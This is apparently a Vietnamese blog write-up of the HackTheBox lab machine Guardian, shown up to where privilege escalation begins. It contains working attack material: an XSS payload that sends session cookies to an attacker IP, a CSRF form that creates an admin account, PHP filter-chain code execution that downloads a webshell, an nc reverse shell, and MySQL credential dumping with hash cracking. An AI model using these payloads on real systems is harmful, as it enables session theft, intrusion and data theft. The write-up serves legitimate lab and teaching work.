---
layout: post
author: Neo
title: Hackthebox - Signed
image: /assets/img/2025-11-12-HTB-Guardian/intro.png
date: 2025-11-12
tags:
  - web
  - CVE-2025-22131
  - xss
  - csrf
  - ssrf
  - LFI
  - mysql
  - python
  - linux
  - hackthebox
categories: ctf
---
0. this unordered seed list will be replaced by toc as unordered list
{:toc}
## Reconnaissance and Scanning

```bash
rustscan -a 10.10.11.84 -- -sC -sV -oN nmap
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTkehIuVT04tJc00jcFVYdmQYDY3RuiImpFenWc9Yi6
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Thêm domain và file host

```bash
sudo nano /etc/hosts
```

```bash
10.10.11.84     guardian.htb
```
## Enumeration and Gaining access

### Web summary

```bash
whatweb http://guardian.htb/
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian]
└─$ whatweb http://guardian.htb/
http://guardian.htb/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], Email[GU0142023@guardian.htb,GU0702025@guardian.htb,GU6262023@guardian.htb,admissions@guardian.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.84], Script, Title[Guardian University - Empowering Future Leaders]   
```

Dựa vào thông tin tổng quan, bước đầu khẳng định đây là website của 1 trường đại học, chứa một số thông tin về sinh viên như email. Từ đây có thể biết được format của mã số sinh viên (student ID) và format của email sinh viên. Thông thường, trong thực tế các trường đại học hay lấy email sinh viên để làm thông tin đăng nhập vào hệ thống học tập của trường.

Phân tích sâu hơn về format của student ID, nó sẽ có dạng `GUXXXXXX` với:
- 4 số cuối dường như là năm, có thể là năm mà sinh viên này vào trường. Giả sử trường đại học này có thời gian học là 5 năm, vậy số năm sẽ kéo dài từ 2021 -> 2025.
- 3 số đầu có thể là số thứ tự của sinh viên đó trong khóa, từ 000 -> 999.

Ngoài ra còn có email `admissions@guardian.htb` có thể là email quản lý.
### Directories

```bash
dirsearch -u http://guardian.htb
```

```bash
[03:42:15] Starting:                                                                                                                             
[03:42:23] 403 -  277B  - /.ht_wsr.txt                                      
[03:42:23] 403 -  277B  - /.htaccess.bak1                                   
[03:42:23] 403 -  277B  - /.htaccess.orig                                   
[03:42:23] 403 -  277B  - /.htaccess.sample                                 
[03:42:23] 403 -  277B  - /.htaccess.save
[03:42:23] 403 -  277B  - /.htaccess_extra                                  
[03:42:23] 403 -  277B  - /.htaccess_sc
[03:42:23] 403 -  277B  - /.htaccess_orig
[03:42:23] 403 -  277B  - /.htaccessOLD2
[03:42:23] 403 -  277B  - /.htaccessBAK
[03:42:23] 403 -  277B  - /.htaccessOLD
[03:42:23] 403 -  277B  - /.htm                                             
[03:42:23] 403 -  277B  - /.html
[03:42:23] 403 -  277B  - /.htpasswds                                       
[03:42:23] 403 -  277B  - /.htpasswd_test
[03:42:23] 403 -  277B  - /.httr-oauth
[03:42:24] 403 -  277B  - /.php                                             
[03:42:26] 301 -  309B  - /js  ->  http://guardian.htb/js/                  
[03:42:42] 403 -  277B  - /cgi-bin/                                         
[03:42:43] 301 -  310B  - /css  ->  http://guardian.htb/css/                
[03:42:47] 301 -  313B  - /images  ->  http://guardian.htb/images/          
[03:42:47] 403 -  277B  - /images/                                          
[03:42:48] 404 -   16B  - /index.php/login/                                 
[03:42:48] 301 -  317B  - /javascript  ->  http://guardian.htb/javascript/  
[03:42:48] 403 -  277B  - /js/                                              
[03:42:53] 403 -  277B  - /php5.fcgi                                        
[03:42:55] 403 -  277B  - /server-status/                                   
[03:42:55] 403 -  277B  - /server-status   
```

Sau khi truy cập các directories và phân tích, không tìm thấy thông tin đáng chú ý nào có thể dùng để làm dữ liệu khai thác.

### Vhosts

Thử `ffuf` lần đầu tiên, phát hiện ra size của web là 6741, thêm filter size với options `-fs`

```bash
ffuf -u http://guardian.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.guardian.htb" -r -t 20 -fs 6741
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian]
└─$ ffuf -u http://guardian.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.guardian.htb" -r -t 30 -fs 6741 -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://guardian.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.guardian.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6741
 :: Filter           : Response words: 1
________________________________________________

gitea                   [Status: 200, Size: 13498, Words: 1049, Lines: 245, Duration: 57ms]
portal                  [Status: 200, Size: 2900, Words: 896, Lines: 84, Duration: 64ms]
```

Thêm 2 vhost mới vào file hosts

```bash
sudo nano /etc/hosts
```

```bash
10.10.11.84     guardian.htb    gitea.guardian.htb    portal.guardian.htb
```

Truy cập vào trang web và tìm thấy nơi truy cập `portal.guardian.htb`

![](/assets/img/2025-11-12-HTB-Guardian/1.png)

Xem qua trang site chính thức của trường và thấy một số thông tin đã dự đoán ở trên.

![](/assets/img/2025-11-12-HTB-Guardian/2.png)

### portal.guardian.htb

![](/assets/img/2025-11-12-HTB-Guardian/3.png)

Đây chính là phần truy cập vào hệ thống của trường. Mục tiêu là tìm ra Username và Pasword. Ngay khi vào trang, 1 popup thông báo về việc checkout `Portal Guide`

![](/assets/img/2025-11-12-HTB-Guardian/4.png)

Từ `Portal Guide` biết được mọi user khi được tạo mới đều có default password là `GU1234`. Trong thực tế, khá nhiều sinh viên không đổi password sau khi đăng nhập lần đầu vì cảm thấy không quan trọng.

Kết hợp với những dữ kiện đã dự đoán phía trên, tôi sẽ thử với 3 user được đề cập trên trang chủ của trường và default password và nhận được kết quả là user `GU0142023` không đổi password, có thể login bằng default password.

![](/assets/img/2025-11-12-HTB-Guardian/5.png)

Lướt qua các thành phần của hệ thống học tập này, có một số thông tin nổi bật đáng chú ý:

- **My Course** để xem các môn đang học.
- **Assignments** bao gồm các bài tập đã hoàn thành và các bài tập đang thực hiện.
- Không thể xem được thông tin của các bài tập đã quá hạn, chỉ truy cập được các bài tập đang trong quá trình thực hiện.
- **Chats** bao gồm các tin nhắn giữa các sinh viên.
- **Notice Board** chứa thông báo của tất cả thành viên.

Truy cập **My Course** -> **View Course** tôi xem được thông tin môn học và có thể chuyển hướng đến **Assignments** hoặc **Grades**.

Trong **Assignments** chỉ có 1 bài tập đang thực hiện. Xem chi tiết, có một nơi để nộp bài tập, phần upload này chỉ cho phép file `.doc` và `.xlsx` 

![](/assets/img/2025-11-12-HTB-Guardian/6.png)

### IDOR

Truy cập phần **Chats**, tôi có thể thực hiện type bất kỳ điều gì.

![](/assets/img/2025-11-12-HTB-Guardian/7.png)

Tuy nhiên để ý URL có một format khá quen thuộc `../index.php?page=`. Thử các lỗ hổng phổ biến cho format này như `LFI`, `Broken Access Control`, v.v... Tôi tìm được lỗ hổng `IDOR`, có thể truy cập đoạn hội thoại của những sinh viên khác mà không cần truy cập vào user của họ chỉ bằng cách thay đổi ID của `chat_users`.

Từ đây tôi cũng biết được user hiện tại `GU0142023` đang có ID là 13. Thử thay đổi ID thành những số thứ tự đầu tiên để tìm `admin` user, vì theo logic thông thường, những user có đặc quyền cao luôn được khởi tạo cùng với hệ thống và thường có ID 0 hoặc 1.

![](/assets/img/2025-11-12-HTB-Guardian/8.png)

Sau khi thay đổi chat thành ID 1 và 2 thì tôi nhận được thông tin đăng nhập mới của user `jamil.enockson`, và theo như câu phía trước thì đây là thông tin đăng nhập của `gitea`, một trong 2 vhost đã tìm được ở phần trên.

### gitea.guardian.htb

Truy cập `gitea` với thông tin đăng nhập vừa tìm được. Tuy nhiên khi đăng nhập bằng tên và password thì không được. Tôi quyết định thêm đuôi `@guardian.htb` để đăng nhập bằng email và thành công.

Với `gitea version 1.23.7`  tôi không tìm thấy exploit nào có thể khai thác được nên sẽ tạm thời bỏ qua hướng này.

![](/assets/img/2025-11-12-HTB-Guardian/9.png)

Trong `Explore` tôi có 2 repositories, là source code của 2 site `guardian.htb` và `portal.guardian.htb`. Phân tích 2 source này thì trang chủ không có nhiều ý nghĩa, chuyển sang `portal` tôi tìm được một số thông tin hữu ích.

Dành 1 khoảng thời gian tương đối để phân tích toàn bộ source code của `portal`, trong `/config/config.php` tôi tìm được thông tin đăng nhập `mysql` của user `root`

![](/assets/img/2025-11-12-HTB-Guardian/10.png)

Trong `/student/submission.php` tôi tìm thấy đoạn server lưu file bài tập khi người dùng upload lên server. File upload sẽ được lưu trong `../attachment_uploads/` với `0777` permission.

![](/assets/img/2025-11-12-HTB-Guardian/11.png)

File `composer.json` ở ngay bên ngoài repo liệt kê các thư viện yêu cầu và phiên bản của nó.

![](/assets/img/2025-11-12-HTB-Guardian/12.png)

### CVE-2025-22131

Thử tìm kiếm lỗ hổng của 2 thư viện này, tôi tìm được [CVE-2025-22131](https://nvd.nist.gov/vuln/detail/CVE-2025-22131), một lỗ hổng của `phpoffice/phpspreadsheet 3.7.0`. Nói qua một chút về thư viện này, đây là thư viện của PHP để xử lý (đọc/ghi) các file spreadsheet như `.xlsx`. Khi thư viện chuyển một file XLSX thành dạng HTML và hiển thị ra màn hình, phần điều hướng (navigation menu) giữa các sheet bằng tên sheet có thể chèn được **malicious code**. 

Tôi cũng tìm được [PoC](https://github.com/s0ck37/CVE-2025-22131-POC) của lỗ hổng này trên github. Poc này sẽ tạo 1 file `.xlsx` có chứa XSS payload, khi upload thành công, web server sẽ xử lý file và thực hiện payload.

Clone git repo

```bash
git clone https://github.com/s0ck37/CVE-2025-22131-POC.git
```

```bash
cd CVE-2025-22131-POC
```

Lợi dụng lỗ hổng để upload XSS payload lấy cookie của `admin`, tạo 1 http listener để nhận cookie trả về từ server

```bash
python3 -m http.server
```

```bash
python3 generate.py '<script>fetch("http://10.10.14.165:8000/"+document.cookie)</script>'
```

File `.xlsx` được tạo thành công

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC]
└─$ python3 generate.py '<script>fetch("http://10.10.14.165:8000/"+document.cookie)</script>'
CVE-2025-22131 XSS Exploit by s0ck37

Usage: python3 generate.py <html>
Example: python3 generate.py "<script>alert(1)</script>"

Reading sample spreadsheet
Embedding injection
Generating final xslx
Exploit written to exploit.xlsx
```

Upload file này lên phần `Assignments` của `portal`

![](/assets/img/2025-11-12-HTB-Guardian/13.png)

Sau khi upload thành công, quay trở lại listener, tôi nhận được cookie

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.84 - - [14/Nov/2025 04:00:38] code 404, message File not found
10.10.11.84 - - [14/Nov/2025 04:00:38] "GET /PHPSESSID=suu0tijql6n34d37k1nq05d1g2 HTTP/1.1" 404 -
```

Sao chép token này vào Cookie Editor,.

![](/assets/img/2025-11-12-HTB-Guardian/14.png)

Lưu cookie và tải lại trang, tôi có được phiên truy cập của user `sammy.treat`.

![](/assets/img/2025-11-12-HTB-Guardian/15.png)

### SSRF - CSRF

Sau khi thực hiện các chức năng của `portal` với user `sammy.treat` có quyền `lecture`, tôi tìm được lỗ hổng SSRF trong phần `Notice Board`.

Quyền `lecture` cho phép user được tạo Notice, bên trong notice có phần `Reference Link (will be reviewed by admin)`, có nghĩa là sau khi tạo notice, admin sẽ xử lý link này. Vậy thì tôi sẽ thử tạo notice và yêu cầu admin tải lên server 1 file từ attack machine.

![](/assets/img/2025-11-12-HTB-Guardian/16.png)

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.84 - - [14/Nov/2025 07:51:14] "GET /exploit.xlsx HTTP/1.1" 200 -
```

Mặc dù đã thử thay revershell và upload thành công lên server nhưng tôi không thể kích hoạt được nó chỉ bằng SSRF. Vậy nên chuyển sang 1 hướng khác đó là dựa vào role của user.

Dựa vào source code trên `gitea` thì `portal` chỉ có 3 quyền cho user là `student`, `lecture` và `admin`. Vậy thay vì tìm cách để lấy `admin` user thì tôi có thể tìm cách tạo 1 user với quyền `admin`, vì sao thì tôi cũng nắm source code trong tay.

Tìm kiếm trong repo, có `admin/createuser.php`

```php
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $csrf_token = $_POST['csrf_token'] ?? '';

    if (!is_valid_token($csrf_token)) {
        die("Invalid CSRF token!");
    }

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';

    // Check for empty fields
    if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role        // Có thể set role tùy ý!!!
        ];

        if ($userModel->create($data)) {
            header('Location: /admin/users.php?created=true');
            exit();
        } else {
            $error = "Failed to create user. Please try again.";
        }
    }
}
?>
```

Tôi nhận ra nếu lấy được `csrf_token` của admin user là có thể tạo được user với bất kỳ quyền nào, vì code sẽ trực tiếp gán role cho user mà không qua bước kiểm tra nào.

`config/csrf_token.php`

```php
<?php

$global_tokens_file = __DIR__ . '/tokens.json';

function get_token_pool()
{
    global $global_tokens_file;
    return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}

function add_token_to_pool($token)
{
    global $global_tokens_file;
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token)
{
    $tokens = get_token_pool();
    return in_array($token, $tokens);
}
```

Nhận thấy có lỗ hổng **CSRF** khá nghiêm trọng ở đây:

- `add_token_to_pool()` chỉ thêm token vào pool mà không xóa token cũ đã tồn tại.
- Tạo token nhưng không gán với session cụ thể nào, chỉ cần token đã tồn tại trong pool thì ai cũng có thể sử dụng token đó, không cần biết user nào đã tạo.
- Token không được giới hạn thời gian nên không hết hạn.

Từ những dữ kiện trên, tôi có thể sử dụng user `Lecturer` để tạo `csrf token` mới, sau đó tạo 1 form submit `createuser` bằng html, lừa admin user click vào `reference_link` tải file lên và mở, từ đó form submit sẽ gửi POST request đến server với `admin` role để tạo 1 user mới với role `admin` 

Truy cập form `Create Notice` để lấy `csrf_token` của response với `PHPSESSID` của `lecturer` user.

```bash
curl http://portal.guardian.htb/lecturer/notices/create.php --cookie "PHPSESSID=<token>" | grep "csrf_token"
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC]
└─$ curl -v http://portal.guardian.htb/lecturer/notices/create.php --cookie "PHPSESSID=qvqtkv29v2ukncotu7cutusmpc" | grep "csrf_token"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6229    0  6229    0     0  19390      0 --:--:-- --:--:-- --:--:-- 19404
                    <input type="hidden" name="csrf_token" value="594c787ec53f1f368b73aa653f9b9ecf">
```

Lưu lại token này và tạo 1 form `create user` bằng html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inconspicuous Document</title>
</head>
<body>
    <form id="create-user" action="http://portal.guardian.htb/admin/createuser.php" method="post">
        <input type="text" name="username" value="john">
        <input type="text" name="password" value="GU1234">
        <input type="text" name="full_name" value="John Doe">
        <input type="text" name="email" value="john.doe@guardian.htb">
        <input type="text" name="dob" value="1999-01-01">
        <input type="text" name="address" value="New York, Mahattan">
        <input type="text" name="user_role" value="admin">
        <input type="text" name="csrf_token" value="594c787ec53f1f368b73aa653f9b9ecf">
    </form>
</body>
<script>
    document.getElementById("create-user").submit();
</script>
</html>
```

Tạo 1 file `.html` để lưu lại nội dung form submit, ví dụ như `new.html`

Bật python http server và thực hiện upload file này bằng `Create Notice`

![](/assets/img/2025-11-12-HTB-Guardian/18.png)

`Notice created successfully. It is pending approval by the admin.`

Login với username và password vừa tạo và lấy token của user `john` rồi lưu vào file `cookie.txt`.

```bash
curl -X POST http://portal.guardian.htb/login.php -d "username=john&password=GU1234" -c cookie.txt
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC]
└─$ cat cookie.txt                                                                                    
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

portal.guardian.htb     FALSE   /       FALSE   0       PHPSESSID       lcq2et7jkams7mclsijr04sj6c
```

Copy token này và paste vào Cookie-Editor trên browser, lưu lại và tải lại trang. Vì token không bao giờ hết hạn nên tôi sẽ lưu lại token này để sử dụng, không cần thông qua session của `lecturer` user nữa.

![](/assets/img/2025-11-12-HTB-Guardian/19.png)

### RFI

Trong Admin panel, tôi có thêm 1 phần mới là Reports. Truy cập vào site này, nhìn thấy URL với format quen thuộc và nghĩ ngay đến việc thử một các lỗ hổng phổ biến.

![](/assets/img/2025-11-12-HTB-Guardian/20.png)

![](/assets/img/2025-11-12-HTB-Guardian/21.png)

Server trả về một lỗi tương ứng với input nhập vào. Quay trở lại source code để kiểm tra `admin/reports.php`

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>
```

Có 2 bộ lọc kiểm tra URL:

- Nếu trong URL chứa `..` thì trả về lỗi `Malicious request blocked`
- URL buộc phải kết thúc bằng 1 trong số 4 tên file `enrollment|academic|financial|system` và kết thúc bằng `.php`

Thử một số kiểu bypass phổ biến mà tôi hay dùng và nhận ra tôi có thể lấy được nội dung file back-end bằng cách mã hóa base64 với `php://filter`.

```php
php://filter/convert.base64-encode/resource=reports/system.php
```

![](/assets/img/2025-11-12-HTB-Guardian/22.png)

Với cách này thì chỉ có thể in ra các file trong whitelist. Tìm kiếm các cách bypass khác trong các cheatsheet, tôi tìm thấy [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) trong [PayloadsAllTheThings - File Inclusion](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wrapper-phpfilter)

Clone repo này về và tạo 1 payload đơn giản.

```bash
python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian/php_filter_chain_generator]
└─$ python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'   
[+] The following gadget chain will generate the following code : <?php system("whoami"); ?> (base64 value: PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLAT...............decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Tuy nhiên payload này không thỏa mãn đủ các điều kiện của filter. Để tiết kiệm thời gian, tôi hỏi AI, cụ thể là Claude, về cách để bypass đoạn filter trong source code bằng php filter

![](/assets/img/2025-11-12-HTB-Guardian/23.png)

Thêm Bypass regex vào cuối payload

![](/assets/img/2025-11-12-HTB-Guardian/24.png)

Thành công! Tuy nhiên khi thử nghiệm với rất nhiều payload và revershell (bất kỳ payload nào trong https://www.revshells.com/) khác nhau nhưng đều không có kết quả.

Một lần nữa phải nhờ đến anh bạn Claude và tôi đã nhận được đáp án khả thi.

![](/assets/img/2025-11-12-HTB-Guardian/25.png)

Clone repo về và bật http server để đẩy `phpbash.php` lên server

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian]
└─$ git clone https://github.com/Arrexel/phpbash.git                    
Cloning into 'phpbash'...
remote: Enumerating objects: 85, done.
remote: Total 85 (delta 0), reused 0 (delta 0), pack-reused 85 (from 1)
Receiving objects: 100% (85/85), 34.02 KiB | 11.34 MiB/s, done.
Resolving deltas: 100% (40/40), done.
                                                              
┌──(kali㉿kali)-[~/htb/machines/Guardian]
└─$ cd phpbash 
                                                               
┌──(kali㉿kali)-[~/htb/machines/Guardian/phpbash]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Tạo lại payload với `php_filter_chain_generator`, dán payload vào Burpsuite

```bash
python3 php_filter_chain_generator.py --chain '<?php system("wget http://10.10.14.165:8000/phpbash.php"); ?>'
```

![](/assets/img/2025-11-12-HTB-Guardian/26.png)

Truy cập file `phpbash.php` trong thư mục `admin/`

![](/assets/img/2025-11-12-HTB-Guardian/27.png)

Sử dụng revershell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.165 9999 >/tmp/f
```

Copy nó vào webshell và Enter. Quay trở lại kali terminal

![](/assets/img/2025-11-12-HTB-Guardian/28.png)

## User

Sử dụng thông tin đăng nhập của root truy cập vào mysql đã tìm thấy bên trong source code

```bash
www-data@guardian:~$ mysql -h localhost -u root -p'Gu4rd14n_un1_1s_th3_b3st'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 787295
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Tìm kiếm và khai thác các thông tin trong db này.

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use guardiandb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)

mysql> desc users;
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| Field         | Type                               | Null | Key | Default           | Extra                                         |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| user_id       | int                                | NO   | PRI | NULL              | auto_increment                                |
| username      | varchar(255)                       | YES  | UNI | NULL              |                                               |
| password_hash | varchar(255)                       | YES  |     | NULL              |                                               |
| full_name     | varchar(255)                       | YES  |     | NULL              |                                               |
| email         | varchar(255)                       | YES  |     | NULL              |                                               |
| dob           | date                               | YES  |     | NULL              |                                               |
| address       | text                               | YES  |     | NULL              |                                               |
| user_role     | enum('student','lecturer','admin') | YES  |     | student           |                                               |
| status        | enum('active','inactive')          | YES  |     | active            |                                               |
| created_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED                             |
| updated_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
11 rows in set (0.00 sec)

mysql> select username,password_hash,email,user_role from users;
+--------------------+------------------------------------------------------------------+---------------------------------+-----------+
| username           | password_hash                                                    | email                           | user_role |
+--------------------+------------------------------------------------------------------+---------------------------------+-----------+
| admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | admin@guardian.htb              | admin     |
........................
| GU3052023          | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 | GU3052023@guardian.htb          | student   |
| GU1462023          | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 | GU1462023@guardian.htb          | student   |
+--------------------+------------------------------------------------------------------+---------------------------------+-----------+
62 rows in set (0.00 sec)
```

Vì có quá nhiều hash ở đây mà copy thủ công thì rất mệt nên tôi sẽ lưu db này về kali

```bash
www-data@guardian:~$ mysql -h localhost -u root -p'Gu4rd14n_un1_1s_th3_b3st' -e 'use guardiandb;select * from users' >> users.sql
www-data@guardian:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
wget http://10.10.11.84:8000/users.sql
```

Nhớ lại trong `config.php` có thêm `salt` để tạo hash ngẫu nhiên, thêm nữa trong `createuser.php` cũng đã khẳng định về việc dùng `salt` với thuật toán mã hóa SHA256. Vậy thì để crack được password này, tôi cũng cần phải sử dụng `salt` trong câu lệnh crack.

Đoạn này thì lại phải nhờ anh bạn Claude lọc file `users.sql` và lấy ra username, password hash, sau đó sửa lại định dạng để có thể đưa vào tool crack (username:hash$salt). Kết quả

```
admin:694a63de406521120d9....0f7da535fd6d6$8Sb)tM1vs1SS
jamil.enockson:c1d8dfaeee103d01a5a....02ff4f9a43ee440250$8Sb)tM1vs1SS
mark.pargetter:8623e713bb98ba2d4....e4ba1cc6f37f97a10e$8Sb)tM1vs1SS
valentijn.temby:1d1bb7b3c6a2a461362....2b2a9cd3c0ff284e6$8Sb)tM1vs1SS
................
```

Dùng `john` để crack password, chọn crack format là SHA256

```bash
john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=dynamic='sha256($p.$s)' hash.txt
```

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian]
└─$ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=dynamic='sha256($p.$s)' hash.txt
Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (dynamic=sha256($p.$s) [512/512 AVX512BW 16x])
Warning: no OpenMP support for this hash type, consider --fork=10
Press 'q' or Ctrl-C to abort, almost any other key for status
*********    (jamil.enockson)     
*********      (admin)     
```

Thử login ssh với password vừa tìm được.

```bash
┌──(kali㉿kali)-[~/htb/machines/Guardian]
└─$ ssh jamil@10.10.11.84
jamil@10.10.11.84's password: 
jamil@guardian:~$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
jamil@guardian:~$ ls
user.txt
jamil@guardian:~$ 
```

## Privilege escalation

### mark

`sudo -l`

```bash
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

Kiểm tra thông tin của file này

```bash
jamil@guardian:~$ ll /opt/scripts/utilities/utilities.py 
-rwxr-x--- 1 root admins 1136 Apr 20  2025 /opt/scripts/utilities/utilities.py*
```

Group `admins` có quyền thực thi file này, đồng thời user `jamil` cũng nằm trong group `admins`.

`cat /opt/scripts/utilities/utilities.py`

```python
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

Mã python có vẻ được dùng để kiểm tra các thông số của hệ thống, import các lib từ `utils`. Kiểm tra thư mục `utils`

```bash
jamil@guardian:~$ ll /opt/scripts/utilities/utils/
total 24
drwxrwsr-x 2 root root   4096 Jul 10 14:20 ./
